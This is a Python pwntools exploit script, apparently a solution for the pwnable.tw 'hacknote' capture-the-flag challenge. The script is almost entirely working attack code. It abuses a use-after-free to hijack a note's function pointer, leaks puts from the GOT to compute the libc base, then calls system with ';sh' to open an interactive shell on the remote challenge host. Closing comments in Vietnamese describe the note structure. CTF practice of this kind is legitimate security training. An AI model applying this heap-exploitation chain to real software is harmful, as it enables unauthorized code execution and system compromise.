#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3

from pwn import *

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./hacknote_patched")
libc = ELF("./libc_32.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)

def connect():
    HOST, PORT = "chall.pwnable.tw", 10102

    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)

    return e.process()

def GDB(p):
    script = '''
    '''
    gdb.attach(p, gdbscript=script)


# OFFSET & VARIABLES
CALL_PUTS = 0x804862b
PUTS_OFFSET = libc.symbols["puts"]

# FUNCTIONS
def add_note(p, size, data):
	p.sendlineafter(b"Your choice :", B(1))
	p.sendlineafter(b"Note size :", B(size))
	p.sendafter(b"Content :", B(data))

def delete_note(p, index):
	p.sendlineafter(b"Your choice :", B(2))
	p.sendlineafter(b"Index :", B(index))

def print_note(p, index):
	p.sendlineafter(b"Your choice :", B(3))
	p.sendlineafter(b"Index :", B(index))


# MAIN
def main():
	p = connect()

	# LEAK LIBC 
	add_note(p, 24, "A") # [0] # 100
	add_note(p, 24, "A") # [1] # 200

	delete_note(p, 0)
	delete_note(p, 1)

	add_note(p, 8, p32(CALL_PUTS) + p32(e.got.puts)) # [2]

	print_note(p, 0)

	RUNTIME_PUTS = u32(p.recv(4))
	libc.address = RUNTIME_PUTS - PUTS_OFFSET
	SYSTEM_ADDRESS = libc.symbols["system"]

	# Info
	print(f"RUNTIME PUTS -> {hex(RUNTIME_PUTS)}")
	print(f"LIBC BASE -> {hex(libc.address)}")
	print(f"SYSTEM -> {hex(SYSTEM_ADDRESS)}")


	delete_note(p, 2)

	add_note(p, 8, p32(SYSTEM_ADDRESS) + b";sh\0")

	print_note(p, 0)

	p.interactive()


if __name__ == '__main__':
    main()


'''

0x804a050 -> Là mảng lưu các malloced(8) chunk mà data của nó là địa chỉ hàm -> 0x0804862b

Từ mỗi i trong 0x804a050 cách 16 bytes sẽ là note được allocated

Mỗi i trong mảng


struct node:
	-> call_puts
	| 4 byte
	-> arg for "puts in call_puts" (real chunk)

'''